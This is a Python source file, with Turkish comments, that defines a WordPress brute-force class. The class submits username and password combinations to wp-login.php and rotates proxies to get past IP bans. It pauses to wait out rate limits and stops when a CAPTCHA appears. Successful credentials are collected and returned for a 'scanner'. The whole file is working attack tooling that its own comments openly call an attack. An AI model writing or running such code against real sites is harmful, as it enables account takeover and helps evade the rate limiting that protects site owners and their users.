import requests
import time

class WPBruteforce:
    def __init__(self, url, user_list, password_list, proxy_list=None, max_attempts=10, timeout=5):
        """WordPress giriş sayfasına yönelik bruteforce saldırısı başlatır"""
        self.url = url.rstrip('/') + "/wp-login.php"
        self.user_list = user_list
        self.password_list = password_list
        self.proxy_list = proxy_list or []
        self.max_attempts = max_attempts  # Maksimum hatalı giriş sayısı
        self.wait_time = timeout if timeout else None  # Rate-limit aşımı için bekleme süresi
        self.successful_logins = []
        self.failed_attempts = 0
        self.current_proxy = None

    def get_proxy(self):
        """Proxy listesinden yeni bir proxy seçer"""
        if self.proxy_list:
            self.current_proxy = {"http": self.proxy_list.pop(0), "https": self.proxy_list.pop(0)}
        else:
            self.current_proxy = None

    def attempt_login(self, username, password):
        """Belirtilen kullanıcı adı ve şifre ile giriş yapmayı dener"""
        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'redirect_to': self.url,
            'testcookie': '1'
        }

        try:
            session = requests.Session()
            response = session.post(self.url, data=data, timeout=5, proxies=self.current_proxy)

            if "dashboard" in response.url or "wp-admin" in response.url:
                self.successful_logins.append((username, password))
                return True
            elif "Too many failed login attempts" in response.text:
                print("[!] CAPTCHA veya IP ban tespit edildi! Saldırı durduruldu.")
                return "captcha"
            return False

        except requests.exceptions.RequestException:
            return None  # Bağlantı hatası

    def run(self):
        """Tüm kullanıcı adı ve şifre kombinasyonlarını test eder ve sonuçları scanner’a gönderir"""
        results = {"successful_logins": [], "failed_attempts": 0}

        for user in self.user_list:
            for pwd in self.password_list:
                if self.failed_attempts >= self.max_attempts:
                    print(f"[!] {self.max_attempts} başarısız giriş tespit edildi. Bekleniyor...")
                    time.sleep(self.wait_time)
                    self.failed_attempts = 0  # Sayaç sıfırla

                if self.proxy_list:
                    self.get_proxy()  # Yeni proxy al

                result = self.attempt_login(user, pwd)
                
                if result is True:
                    results["successful_logins"].append((user, pwd))
                    break  # Eğer giriş başarılıysa o kullanıcı için dur
                elif result == "captcha":
                    return results  # CAPTCHA algılandıysa saldırıyı durdur
                elif result is False:
                    self.failed_attempts += 1
                    results["failed_attempts"] += 1

        return results  # Scanner’a gönderilecek veri